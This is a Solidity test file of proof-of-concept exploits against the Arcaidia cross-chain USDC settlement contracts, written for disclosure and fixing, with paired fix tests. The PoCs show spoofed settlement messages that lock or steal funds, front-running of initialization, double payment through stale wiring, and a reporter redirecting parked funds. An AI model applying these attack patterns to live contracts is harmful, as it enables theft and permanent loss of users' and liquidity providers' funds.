// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ChainFixture} from "./base/ChainFixture.sol";
import {TestPolicies} from "./base/TestPolicies.sol";
import {ArcaidiaDeployer} from "../src/deploy/ArcaidiaDeployer.sol";
import {ArcaidiaDeployment} from "../src/deploy/ArcaidiaDeployment.sol";
import {ArcaidiaIntentRouter} from "../src/ArcaidiaIntentRouter.sol";
import {ArcaidiaLiquidityVault} from "../src/ArcaidiaLiquidityVault.sol";
import {ArcaidiaVaultFactory} from "../src/ArcaidiaVaultFactory.sol";
import {ArcaidiaIntentMarket} from "../src/ArcaidiaIntentMarket.sol";
import {SettlementReceiver} from "../src/SettlementReceiver.sol";
import {ISettlementCheck} from "../src/interfaces/ISettlementCheck.sol";
import {IVaultRegistry} from "../src/interfaces/IVaultRegistry.sol";
import {IFillRegistry} from "../src/interfaces/IFillRegistry.sol";
import {IntentHookLib} from "../src/libraries/IntentHookLib.sol";
import {IntentLib} from "../src/libraries/IntentLib.sol";
import {FillAuthorization, Intent, INTENT_VERSION, USDC_TOKEN_OUT} from "../src/libraries/ArcaidiaTypes.sol";
import {MockUSDC} from "../src/mocks/MockUSDC.sol";
import {MockSettlementInitiator} from "../src/mocks/MockSettlementInitiator.sol";
import {MockMessageTransmitterV2} from "../src/mocks/MockMessageTransmitterV2.sol";
import {MockTokenMessengerV2} from "../src/mocks/MockTokenMessengerV2.sol";
import {CircleCCTPInitiator} from "../src/CircleCCTPInitiator.sol";

/// @notice USDC with Circle's blocklist behaviour: any transfer to or from a blocked address reverts.
contract BlocklistUSDC is MockUSDC {
    mapping(address => bool) public blocked;

    function setBlocked(address account, bool value) external {
        blocked[account] = value;
    }

    function _update(address from, address to, uint256 value) internal override {
        require(!blocked[from] && !blocked[to], "Blacklistable: account is blacklisted");
        super._update(from, to, value);
    }
}

/// @notice A winner whose reimbursement always reverts, so canonical funds park as HELD_FOR_VAULT.
contract RefusingWinner is IFillRegistry {
    function isFilled(bytes32) external pure returns (bool) {
        return true;
    }

    function advancedPrincipal(bytes32) external pure returns (uint256) {
        return 1;
    }

    function recordReimbursement(bytes32, uint256) external pure {
        revert("refuses");
    }
}

/// @title Mainnet-readiness proof-of-concept tests
/// @notice Each `test_PoC_*` reproduces a defect in the CURRENT contracts and passes because the
///         defect is real. When a defect is fixed, its PoC must be inverted into a regression test
///         that asserts the attack fails. `test_Fix_*` tests show the relationship the fix must
///         establish, built from existing contracts only. See docs/MAINNET_READINESS.md.
contract MainnetReadinessPoCTest is ChainFixture {
    uint32 internal constant SRC_DOMAIN = 0;
    uint32 internal constant DST_DOMAIN = 26;
    address internal constant TOKEN_MESSENGER = 0x28b5a0e9C621a5BadaA536219b3a228C8168cf5d;

    ArcaidiaDeployer internal deployer;
    MockUSDC internal asset;
    MockSettlementInitiator internal initiator;
    MockMessageTransmitterV2 internal transmitter;
    ArcaidiaDeployment.Deployment internal d;

    address internal protocolOwner = makeAddr("protocolOwner");
    address internal reporter = makeAddr("settlementReporter");
    address internal treasury = makeAddr("treasury");
    address internal operator = makeAddr("operator");
    address internal lp = makeAddr("lp");
    address internal user = makeAddr("user");
    address internal recipient = makeAddr("recipient");
    address internal attacker = makeAddr("attacker");

    uint256 internal agentKey;
    address internal agent;

    function setUp() public {
        _configureDirection();
        vm.chainId(destinationChainId);
        (agent, agentKey) = makeAddrAndKey("agent");
        _deployProtocol(new MockUSDC());
    }

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    function _deployProtocol(MockUSDC asset_) internal {
        deployer = new ArcaidiaDeployer();
        asset = asset_;
        initiator = new MockSettlementInitiator();
        transmitter = new MockMessageTransmitterV2(asset);
        ArcaidiaDeployment.Deployment memory predicted = ArcaidiaDeployment.predict(deployer, address(this));
        d = ArcaidiaDeployment.deployAll(
            deployer,
            ArcaidiaDeployment.Config({
                owner: protocolOwner,
                settlementAsset: address(asset),
                settlementInitiator: address(initiator),
                messageTransmitter: address(transmitter),
                destinationChainId: sourceChainId,
                destinationSettlementReceiver: predicted.settlementReceiver,
                reserveFloorBps: 1_000,
                maxFillBps: 5_000,
                maxExposureBps: 8_000,
                feePolicy: TestPolicies.tiered(),
                houseVaultLabel: "House",
                treasury: treasury,
                protocolFeeShareBps: 5_000,
                maxIntentAmount: 1_000e6,
                maxInFlightValue: 300e6,
                settlementReporter: reporter
            }),
            address(this)
        );
    }

    /// An independent operator creates a vault through the factory, funds it and authorises a signer.
    function _operatorVault(bytes32 salt) internal returns (ArcaidiaLiquidityVault vault) {
        vm.prank(operator);
        vault = ArcaidiaLiquidityVault(
            ArcaidiaVaultFactory(d.factory).createVault(salt, 1_000, 5_000, 8_000, TestPolicies.tiered(), "Operator")
        );
        vm.prank(operator);
        vault.setAuthorisedSigner(agent, true);
        asset.mint(lp, 10_000e6);
        vm.startPrank(lp);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(10_000e6, lp);
        vm.stopPrank();
    }

    function _intent(uint256 nonce, uint256 amount) internal view returns (Intent memory) {
        return Intent({
            intentVersion: INTENT_VERSION,
            sender: user,
            recipient: recipient,
            inputToken: address(asset),
            amount: amount,
            sourceChainId: sourceChainId,
            destinationChainId: block.chainid,
            maxFeeBps: 100,
            deadline: uint64(block.timestamp + 1 hours),
            nonce: nonce,
            tokenOut: USDC_TOKEN_OUT,
            targetMinOut: 0
        });
    }

    function _fill(ArcaidiaLiquidityVault vault, Intent memory intent) internal {
        uint256 fee = (intent.amount * 10 + 9_999) / 10_000; // tiered base tier, 10 bps, rounded up
        FillAuthorization memory auth = FillAuthorization({
            intentId: IntentLib.computeIntentId(intent),
            sourceChainId: intent.sourceChainId,
            sourceTxHash: keccak256("source-tx"),
            recipient: intent.recipient,
            inputAmount: intent.amount,
            outputAmount: intent.amount - fee,
            feeAmount: fee,
            expiry: uint64(block.timestamp + 45),
            nonce: uint256(IntentLib.computeIntentId(intent))
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(agentKey, vault.hashFillAuthorization(auth));
        vault.fastFill(intent, auth, abi.encodePacked(r, s, v));
    }

    function _message(address receiver, bytes32 intentId, uint256 amount, bytes32 nonce)
        internal
        view
        returns (bytes memory)
    {
        return transmitter.encodeMessage(
            MockMessageTransmitterV2.MessageSpec({
                sourceDomain: SRC_DOMAIN,
                destinationDomain: DST_DOMAIN,
                nonce: nonce,
                recipient: TOKEN_MESSENGER,
                destinationCaller: receiver,
                burnToken: address(0xBEEF),
                mintRecipient: receiver,
                amount: amount,
                feeExecuted: 0,
                hookData: IntentHookLib.encode(intentId, recipient)
            })
        );
    }

    /// D12 as it happened on testnet: a v2.1 receiver initialised against the EXISTING market.
    function _redeployReceiverAsD12() internal returns (SettlementReceiver r2) {
        r2 = new SettlementReceiver();
        r2.initialize(protocolOwner, address(asset), d.market, address(transmitter));
        vm.prank(protocolOwner);
        ArcaidiaLiquidityVault(d.vault).setSettlementReceiver(address(r2));
    }

    // -----------------------------------------------------------------------
    // F-00: settlement trusts any CCTP burn that names an intent id in its hook
    // -----------------------------------------------------------------------

    /// A burn made OUTSIDE the router: attacker-chosen amount, attacker-chosen hook. Circle attests
    /// any valid burn, and the receiver never checks the burn's messageSender or source domain.
    function _spoofedMessage(address receiver, bytes32 victimIntentId, uint256 amount, bytes32 nonce)
        internal
        view
        returns (bytes memory)
    {
        return transmitter.encodeMessage(
            MockMessageTransmitterV2.MessageSpec({
                sourceDomain: SRC_DOMAIN,
                destinationDomain: DST_DOMAIN,
                nonce: nonce,
                recipient: TOKEN_MESSENGER,
                destinationCaller: receiver,
                burnToken: address(0xBEEF),
                mintRecipient: receiver,
                amount: amount,
                feeExecuted: 0,
                hookData: IntentHookLib.encode(victimIntentId, attacker)
            })
        );
    }

    /// Unfilled victim: 1 micro-USDC marks it settled, pays the attacker, and blocks every solver.
    /// The user's genuine canonical funds can then never be minted.
    function test_PoC_spoofedHookLocksAnUnfilledIntentForOneMicroUsdc() public {
        SettlementReceiver receiver = SettlementReceiver(d.settlementReceiver);
        ArcaidiaLiquidityVault house = ArcaidiaLiquidityVault(d.vault);
        asset.mint(address(this), 10_000e6);
        asset.approve(address(house), type(uint256).max);
        house.deposit(10_000e6, address(this));
        vm.prank(protocolOwner);
        house.setAuthorisedSigner(agent, true);

        Intent memory victim = _intent(10, 1_000e6);
        bytes32 victimId = IntentLib.computeIntentId(victim);

        bytes memory spoof = _spoofedMessage(address(receiver), victimId, 1, "attacker-burn");
        vm.prank(attacker);
        receiver.settleWithProof(spoof, transmitter.attest(spoof));
        assertEq(uint256(receiver.outcomeOf(victimId)), uint256(SettlementReceiver.Outcome.RECIPIENT_FALLBACK));
        assertEq(asset.balanceOf(attacker), 1, "attacker is the 'recipient'");

        // No solver can fill it any more...
        uint256 fee = (victim.amount * 10 + 9_999) / 10_000;
        FillAuthorization memory auth = FillAuthorization({
            intentId: victimId, sourceChainId: victim.sourceChainId, sourceTxHash: keccak256("tx"),
            recipient: recipient, inputAmount: victim.amount, outputAmount: victim.amount - fee,
            feeAmount: fee, expiry: uint64(block.timestamp + 45), nonce: 10
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(agentKey, house.hashFillAuthorization(auth));
        vm.expectRevert();
        house.fastFill(victim, auth, abi.encodePacked(r, s, v));

        // ...and the genuine message for the user's 1,000 USDC can never be received.
        bytes memory genuine = _message(address(receiver), victimId, 1_000e6, "genuine-burn");
        bytes memory attestation = transmitter.attest(genuine);
        vm.expectRevert(abi.encodeWithSelector(SettlementReceiver.AlreadySettled.selector, victimId));
        receiver.settleWithProof(genuine, attestation);
        assertEq(asset.balanceOf(recipient), 0, "user receives nothing");
    }

    /// Filled victim: a sub-principal spoof parks as HELD_FOR_VAULT forever and the LP's principal is lost.
    function test_PoC_spoofedHookStrandsAFilledVaultsPrincipal() public {
        SettlementReceiver receiver = SettlementReceiver(d.settlementReceiver);
        ArcaidiaLiquidityVault vault = _operatorVault("victim-vault");
        vm.prank(operator);
        vault.setSettlementReceiver(address(receiver));

        Intent memory victim = _intent(11, 1_000e6);
        bytes32 victimId = IntentLib.computeIntentId(victim);
        _fill(vault, victim);
        assertEq(vault.outstandingExposure(), 999e6);

        bytes memory spoof = _spoofedMessage(address(receiver), victimId, 1, "attacker-burn-2");
        vm.prank(attacker);
        receiver.settleWithProof(spoof, transmitter.attest(spoof));
        assertEq(uint256(receiver.outcomeOf(victimId)), uint256(SettlementReceiver.Outcome.HELD_FOR_VAULT));

        vm.expectRevert();
        receiver.retryHeld(victimId);

        bytes memory genuine = _message(address(receiver), victimId, 1_000e6, "genuine-burn-2");
        bytes memory attestation = transmitter.attest(genuine);
        vm.expectRevert(abi.encodeWithSelector(SettlementReceiver.AlreadySettled.selector, victimId));
        receiver.settleWithProof(genuine, attestation);
        assertEq(vault.outstandingExposure(), 999e6, "LP principal never comes back");
    }

    /// Restricting messageSender alone is not enough: the initiator itself accepts any caller and any hook.
    function test_PoC_initiatorAcceptsAnyCallerAndAnyHook() public {
        MockTokenMessengerV2 messenger = new MockTokenMessengerV2();
        CircleCCTPInitiator init = new CircleCCTPInitiator(protocolOwner, address(messenger), address(asset));
        vm.prank(protocolOwner);
        init.setDomain(sourceChainId, SRC_DOMAIN);

        asset.mint(attacker, 1);
        vm.startPrank(attacker);
        asset.approve(address(init), 1);
        init.initiateSettlement(
            address(asset), 1, sourceChainId, d.settlementReceiver, keccak256("anything"),
            IntentHookLib.encode(keccak256("victim"), attacker)
        );
        vm.stopPrank();
        assertEq(messenger.callCount(), 1, "burn issued with the attacker's hook, from the protocol's initiator");
    }

    // -----------------------------------------------------------------------
    // F-01: stale receiver references (market immutable + factory default)
    // -----------------------------------------------------------------------

    /// Reproduces Arc testnet intent 0xd2773113…c8ab3ca (fallback block 61838479, fill block 61838502).
    function test_PoC_staleReceiverWiring_allowsDoublePayment() public {
        SettlementReceiver r2 = _redeployReceiverAsD12();

        // Both protocol-level references still name the retired receiver.
        assertEq(address(ArcaidiaIntentMarket(d.market).settlementCheck()), d.settlementReceiver);
        assertEq(ArcaidiaVaultFactory(d.factory).settlementReceiver(), d.settlementReceiver);

        // A vault created after D12 inherits the retired receiver from the factory.
        ArcaidiaLiquidityVault vault = _operatorVault("after-d12");
        assertEq(vault.settlementReceiver(), d.settlementReceiver, "factory wired the retired receiver");

        // Nobody fast-fills in time; canonical settlement pays the recipient through the live receiver.
        Intent memory intent = _intent(1, 100e6);
        bytes32 intentId = IntentLib.computeIntentId(intent);
        bytes memory message = _message(address(r2), intentId, 100e6, "n1");
        r2.settleWithProof(message, transmitter.attest(message));
        assertEq(uint256(r2.outcomeOf(intentId)), uint256(SettlementReceiver.Outcome.RECIPIENT_FALLBACK));
        assertEq(asset.balanceOf(recipient), 100e6);

        // A late solver fill succeeds: the market asks the retired receiver, and so does the vault.
        _fill(vault, intent);

        assertEq(asset.balanceOf(recipient), 100e6 + 99.9e6, "recipient paid twice");
        assertEq(vault.outstandingExposure(), 99.9e6, "a receivable that can never be reimbursed");
        assertEq(vault.totalAssets(), 10_000e6, "share price still counts the lost principal");
    }

    /// The relationship the fix must establish: the market reads the receiver that actually settles,
    /// so a late claim is refused even when an individual vault's own receiver pointer is stale.
    function test_Fix_marketBoundToLiveReceiverRefusesLateClaimRegardlessOfVaultWiring() public {
        SettlementReceiver live = new SettlementReceiver();
        ArcaidiaIntentMarket boundMarket =
            new ArcaidiaIntentMarket(ISettlementCheck(address(live)), IVaultRegistry(d.factory));
        live.initialize(protocolOwner, address(asset), address(boundMarket), address(transmitter));

        ArcaidiaLiquidityVault vault = _operatorVault("bound");
        vm.prank(operator);
        vault.setMarket(address(boundMarket));
        assertEq(vault.settlementReceiver(), d.settlementReceiver, "vault pointer deliberately left stale");

        Intent memory intent = _intent(2, 100e6);
        bytes32 intentId = IntentLib.computeIntentId(intent);
        bytes memory message = _message(address(live), intentId, 100e6, "n2");
        live.settleWithProof(message, transmitter.attest(message));

        uint256 fee = (intent.amount * 10 + 9_999) / 10_000;
        FillAuthorization memory auth = FillAuthorization({
            intentId: intentId,
            sourceChainId: intent.sourceChainId,
            sourceTxHash: keccak256("source-tx"),
            recipient: recipient,
            inputAmount: intent.amount,
            outputAmount: intent.amount - fee,
            feeAmount: fee,
            expiry: uint64(block.timestamp + 45),
            nonce: 2
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(agentKey, vault.hashFillAuthorization(auth));
        vm.expectRevert(
            abi.encodeWithSelector(ArcaidiaIntentMarket.IntentAlreadySettledCanonically.selector, intentId)
        );
        vault.fastFill(intent, auth, abi.encodePacked(r, s, v));
        assertEq(asset.balanceOf(recipient), 100e6, "paid exactly once");
    }

    /// Property form of the fix: for any intent the live receiver has settled, no factory vault can
    /// win it, whatever that vault's own settlementReceiver says.
    function testFuzz_Fix_noClaimAfterLiveSettlement(bytes32 intentId, uint96 amount) public {
        vm.assume(amount > 0);
        SettlementReceiver live = new SettlementReceiver();
        ArcaidiaIntentMarket boundMarket =
            new ArcaidiaIntentMarket(ISettlementCheck(address(live)), IVaultRegistry(d.factory));
        live.initialize(protocolOwner, address(asset), address(boundMarket), address(transmitter));
        ArcaidiaLiquidityVault vault = _operatorVault(keccak256(abi.encode(intentId)));

        bytes memory message = _message(address(live), intentId, amount, intentId);
        live.settleWithProof(message, transmitter.attest(message));

        vm.prank(address(vault));
        vm.expectRevert(
            abi.encodeWithSelector(ArcaidiaIntentMarket.IntentAlreadySettledCanonically.selector, intentId)
        );
        boundMarket.claimIntent(intentId, amount, 0);
    }

    // -----------------------------------------------------------------------
    // F-02: deployment can be front-run (non-atomic initialize, permissionless deployer)
    // -----------------------------------------------------------------------

    function test_PoC_receiverInitializeIsFrontRunnable() public {
        ArcaidiaDeployer fresh = new ArcaidiaDeployer();
        // deployAll deploys the receiver with an EMPTY init call; initialize is a separate transaction.
        address receiver =
            fresh.deploy(ArcaidiaDeployment.RECEIVER_SALT, type(SettlementReceiver).creationCode, "");

        vm.prank(attacker);
        SettlementReceiver(receiver).initialize(attacker, address(asset), attacker, attacker);

        vm.expectRevert(SettlementReceiver.AlreadyInitialized.selector);
        SettlementReceiver(receiver).initialize(protocolOwner, address(asset), d.market, address(transmitter));
        assertEq(SettlementReceiver(receiver).owner(), attacker, "attacker owns the canonical receiver address");
    }

    function test_PoC_anyoneCanOccupyTheCanonicalRouterAddress() public {
        ArcaidiaDeployer fresh = new ArcaidiaDeployer();
        address predicted = fresh.predictAddress(
            ArcaidiaDeployment.ROUTER_SALT, keccak256(type(ArcaidiaIntentRouter).creationCode)
        );
        vm.prank(attacker);
        fresh.deploy(
            ArcaidiaDeployment.ROUTER_SALT,
            type(ArcaidiaIntentRouter).creationCode,
            abi.encodeCall(ArcaidiaIntentRouter.initialize, (attacker, address(asset), attacker, 1, 1))
        );
        assertEq(ArcaidiaIntentRouter(predicted).owner(), attacker, "predicted router owned by attacker");
    }

    // -----------------------------------------------------------------------
    // F-03: the reporter recovery path
    // -----------------------------------------------------------------------

    function test_PoC_reporterCanPermanentlyBlockGenuineSettlement() public {
        SettlementReceiver receiver = SettlementReceiver(d.settlementReceiver);
        bytes32 intentId = keccak256("pending-intent");

        // One wei donated by anyone is enough for the reporter's balance check.
        asset.mint(address(receiver), 1);
        vm.prank(reporter);
        receiver.settle(intentId, reporter, 1);

        // The genuine Circle message can now never be received: only the receiver may present it.
        bytes memory message = _message(address(receiver), intentId, 100e6, "n3");
        bytes memory attestation = transmitter.attest(message);
        vm.expectRevert(abi.encodeWithSelector(SettlementReceiver.AlreadySettled.selector, intentId));
        receiver.settleWithProof(message, attestation);
        assertEq(transmitter.usedNonces("n3"), 0, "canonical USDC stays unminted");
    }

    function test_PoC_reporterCanRedirectParkedFunds() public {
        SettlementReceiver receiver = SettlementReceiver(d.settlementReceiver);
        RefusingWinner winner = new RefusingWinner();
        // The market only admits factory vaults; the registry check is bypassed here by claiming from
        // the House Vault's address, which is exactly as privileged as any factory vault.
        bytes32 heldIntent = keccak256("held");
        vm.etch(d.vault, address(winner).code);
        vm.prank(d.vault);
        ArcaidiaIntentMarket(d.market).claimIntent(heldIntent, 99e6, 1e6);

        bytes memory message = _message(address(receiver), heldIntent, 100e6, "n4");
        receiver.settleWithProof(message, transmitter.attest(message));
        assertEq(asset.balanceOf(address(receiver)), 100e6, "funds parked for the winner");

        vm.prank(reporter);
        receiver.settle(keccak256("made-up"), reporter, 100e6);
        assertEq(asset.balanceOf(reporter), 100e6, "reporter took the vault's parked reimbursement");

        vm.expectRevert();
        receiver.retryHeld(heldIntent);
    }

    // -----------------------------------------------------------------------
    // F-04: blocklisted fallback recipient
    // -----------------------------------------------------------------------

    function test_PoC_blocklistedFallbackRecipientLocksCanonicalFunds() public {
        BlocklistUSDC usdc = new BlocklistUSDC();
        _deployProtocol(usdc);
        SettlementReceiver receiver = SettlementReceiver(d.settlementReceiver);
        usdc.setBlocked(recipient, true);

        bytes32 intentId = keccak256("blocked-recipient");
        bytes memory message = _message(address(receiver), intentId, 100e6, "n5");
        bytes memory attestation = transmitter.attest(message);
        vm.expectRevert("Blacklistable: account is blacklisted");
        receiver.settleWithProof(message, attestation);
        assertFalse(receiver.isSettled(intentId));
        assertEq(transmitter.usedNonces("n5"), 0, "no other caller may receive it: destinationCaller is the receiver");
    }

    // -----------------------------------------------------------------------
    // F-05: router in-flight capacity is only released by an owner transaction
    // -----------------------------------------------------------------------

    function test_PoC_inFlightCapacityOnlyGrows() public {
        // The protocol above was deployed on `destinationChainId`, so its router sends to `sourceChainId`.
        ArcaidiaIntentRouter router = ArcaidiaIntentRouter(d.router);
        asset.mint(user, 1_000e6);
        vm.startPrank(user);
        asset.approve(address(router), type(uint256).max);
        for (uint256 i; i < 3; i++) {
            router.createIntent(recipient, 100e6, sourceChainId, 100, uint64(block.timestamp + 1 hours), i, USDC_TOKEN_OUT, 0);
        }
        // Every earlier intent may long since have settled canonically; nothing on chain knows.
        vm.expectRevert(abi.encodeWithSelector(ArcaidiaIntentRouter.InFlightCapExceeded.selector, 400e6, 300e6));
        router.createIntent(recipient, 100e6, sourceChainId, 100, uint64(block.timestamp + 1 hours), 3, USDC_TOKEN_OUT, 0);
        vm.stopPrank();
    }
}
